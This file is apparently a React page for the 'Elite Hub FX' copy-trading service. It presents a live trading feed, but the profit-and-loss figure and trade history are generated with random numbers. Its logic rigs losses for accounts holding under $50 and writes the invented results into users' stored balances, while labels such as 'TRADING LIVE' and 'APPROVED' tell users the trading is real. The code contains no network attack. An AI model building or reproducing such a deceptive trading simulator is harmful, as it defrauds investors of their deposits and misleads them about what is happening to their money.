
"use client";

import { useState, useEffect, useRef, useMemo } from "react";
import { Navbar } from "@/components/navbar";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Zap, Play, Square, Loader2, Info } from "lucide-react";
import { cn } from "@/lib/utils";
import { useUser, useDoc, updateUserProfile } from "@/firebase";

export default function CopiedTrades() {
  const { user } = useUser();
  const userRef = useMemo(() => user?.uid || null, [user]);
  const { data: userProfile } = useDoc(userRef as any);

  const [isTrading, setIsTrading] = useState(false);
  const [todayPnL, setTodayPnL] = useState(0);
  const [history, setHistory] = useState<any[]>([]);
  const tradeStartTime = useRef<number | null>(null);
  
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isTrading && userProfile) {
      if (!tradeStartTime.current) tradeStartTime.current = Date.now();
      
      interval = setInterval(() => {
        const elapsedSeconds = (Date.now() - (tradeStartTime.current || 0)) / 1000;

        setTodayPnL((prev) => {
          let jitter = (Math.random() - 0.5) * 3;
          let trend = Math.sin(Date.now() / 1000) * 1.5;
          let nextVal = prev + jitter + trend;

          const isSmallAccount = (userProfile.balance || 0) < 50;

          // 3.5 minute safety rule (210 seconds)
          if (isSmallAccount && elapsedSeconds < 210) {
            // Systematic downward trend for small accounts, but capped at $24 loss
            nextVal = prev - (Math.random() * 2 + 0.5);
            if (nextVal < -24) {
              nextVal = -24 + Math.random() * 0.5;
            }
          } else if (elapsedSeconds < 210) {
            // Normal accounts: Cap initial losses at $24
            if (nextVal < -24) {
              nextVal = -24 + Math.random() * 0.5;
            }
          }
          
          // Force ranges between -$70 and +$70
          if (nextVal > 70) nextVal = 70 - Math.random() * 5;
          if (nextVal < -70) nextVal = -70 + Math.random() * 5;
          
          // Auto-stop if balance hits zero
          const currentTotal = (userProfile.balance || 0) + nextVal;
          if (currentTotal <= 0) {
            setIsTrading(false);
            if (user?.uid) updateUserProfile(user.uid, { balance: 0 });
            return -(userProfile.balance || 0);
          }

          return nextVal;
        });

        // Live Feed Updates (MetaTrader Speed)
        if (Math.random() > 0.98) {
          const isProfit = todayPnL > 0 && Math.random() > 0.4;
          const val = (Math.random() * 12).toFixed(2);
          const newTrade = {
            id: Date.now(),
            pair: "XAUUSD",
            type: Math.random() > 0.5 ? "Buy" : "Sell",
            lot: (Math.random() * 0.4 + 0.1).toFixed(2),
            profit: isProfit ? `+${val}` : `-${val}`,
            time: new Date().toLocaleTimeString()
          };
          setHistory(prev => [newTrade, ...prev].slice(0, 10));
        }
      }, 80); // 80ms for MT5 high-frequency jitter
    } else {
      tradeStartTime.current = null;
    }
    return () => clearInterval(interval);
  }, [isTrading, userProfile, todayPnL, user]);

  const handleStart = () => {
    if (!userProfile || userProfile.balance <= 0) return;
    setIsTrading(true);
  };

  const handleStop = () => {
    setIsTrading(false);
    if (user?.uid && userProfile) {
      const finalBalance = Math.max(0, userProfile.balance + todayPnL);
      updateUserProfile(user.uid, { balance: finalBalance });
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-[#0A0E0A] text-white font-body">
      <Navbar />
      
      <main className="container mx-auto px-4 py-8 max-w-2xl space-y-8">
        <div className={cn(
          "w-full p-6 rounded-2xl flex items-center gap-3 border transition-all duration-500",
          isTrading 
            ? "bg-[#22C55E]/10 border-[#22C55E]/20 text-[#22C55E] animate-pulse" 
            : "bg-white/5 border-white/10 text-white/70"
        )}>
          <Info className="h-5 w-5 shrink-0" />
          <p className="text-sm font-black uppercase tracking-tight">
            {isTrading ? "You are now copying Elite hub fx trades" : "You are about to copy elite hub fx trades"}
          </p>
        </div>

        {/* Large MT5-Style PnL Header */}
        <div className="grid grid-cols-1 gap-4">
          <div className="space-y-6 bg-white/5 p-8 rounded-[2rem] border border-white/5 text-center shadow-2xl">
            <p className="text-muted-foreground font-black text-xs uppercase tracking-[0.2em]">Today's PnL</p>
            <div className={cn(
              "text-6xl md:text-9xl font-black font-mono tracking-tighter transition-colors duration-75",
              todayPnL >= 0 ? "text-[#22C55E]" : "text-red-500"
            )}>
              {todayPnL >= 0 ? "+" : ""}{todayPnL.toFixed(2)} USD
            </div>
          </div>
        </div>

        <section className="space-y-6">
          <div className="space-y-1">
            <h2 className="text-2xl font-black tracking-tight uppercase">My Master(s)</h2>
            <p className="text-[10px] font-black text-primary uppercase tracking-[0.2em] pl-1">Client: {userProfile?.name || "User"}</p>
          </div>
          
          <Card className="bg-[#141A14] border-none rounded-[2.5rem] overflow-hidden shadow-2xl">
            <CardContent className="p-8 space-y-8">
              <div className="flex items-center gap-6">
                <div className="w-16 h-16 bg-[#D4EBE0] rounded-full flex items-center justify-center text-[#1A2E24] font-black text-xl">AF</div>
                <div className="space-y-2">
                  <h3 className="text-2xl font-black">Elite Hub FX</h3>
                  <div className="flex flex-wrap gap-2">
                    <Badge className="bg-[#E9D9A7] text-[#5C4D1D] font-bold text-[10px] uppercase px-3 py-1">APPROVED</Badge>
                    <Badge className={cn(
                      "font-bold text-[10px] uppercase px-3 py-1",
                      isTrading ? "bg-[#22C55E] text-white" : "bg-muted text-muted-foreground"
                    )}>
                      {isTrading ? "TRADING LIVE" : "INACTIVE"}
                    </Badge>
                  </div>
                </div>
              </div>

              <div className="flex flex-col sm:flex-row gap-4">
                <Button 
                  onClick={handleStart}
                  disabled={isTrading || !userProfile || userProfile.balance <= 0}
                  className="flex-1 h-16 bg-[#22C55E] text-white font-black uppercase text-lg rounded-2xl flex items-center justify-center gap-3 transition-all"
                >
                  <Play className="h-5 w-5 fill-current" />
                  Start Trading
                </Button>
                <Button 
                  onClick={handleStop}
                  disabled={!isTrading}
                  className="flex-1 h-16 bg-[#EF4444] text-white font-black uppercase text-lg rounded-2xl flex items-center justify-center gap-3 transition-all"
                >
                  <Square className="h-5 w-5 fill-current" />
                  Stop Trading
                </Button>
              </div>
            </CardContent>
          </Card>
        </section>

        <section className="space-y-6">
          <div className="flex justify-between items-center">
            <h2 className="text-2xl font-black tracking-tight uppercase">History</h2>
            {isTrading && (
              <Badge variant="outline" className="text-[#22C55E] border-[#22C55E]/20 bg-[#22C55E]/5 animate-pulse rounded-full px-3">
                <Loader2 className="h-3 w-3 mr-1.5 animate-spin" />
                Live Feed
              </Badge>
            )}
          </div>

          <div className="space-y-4 pb-12">
            {history.length === 0 && !isTrading ? (
              <div className="p-16 text-center border-2 border-dashed border-white/10 rounded-[2.5rem] space-y-4">
                <Zap className="h-8 w-8 text-muted-foreground mx-auto" />
                <p className="font-bold text-lg">No Active Trades</p>
              </div>
            ) : (
              history.map(trade => (
                <div key={trade.id} className="flex items-center justify-between p-6 bg-[#141A14] rounded-[2rem] border border-white/5">
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-white/5 rounded-full flex items-center justify-center">
                      <Zap className="h-6 w-6 text-primary fill-current" />
                    </div>
                    <div className="space-y-0.5">
                      <div className="font-black text-xl tracking-tight">{trade.pair}</div>
                      <div className={cn("text-[10px] font-bold uppercase tracking-widest", trade.profit.startsWith('+') ? "text-[#22C55E]" : "text-red-500")}>
                        {trade.type} {trade.lot} lot
                      </div>
                    </div>
                  </div>
                  <div className={cn(
                    "text-2xl font-black font-mono tracking-tighter",
                    trade.profit.startsWith('+') ? "text-[#22C55E]" : "text-red-500"
                  )}>
                    {trade.profit}
                  </div>
                </div>
              ))
            )}
          </div>
        </section>
      </main>
    </div>
  );
}
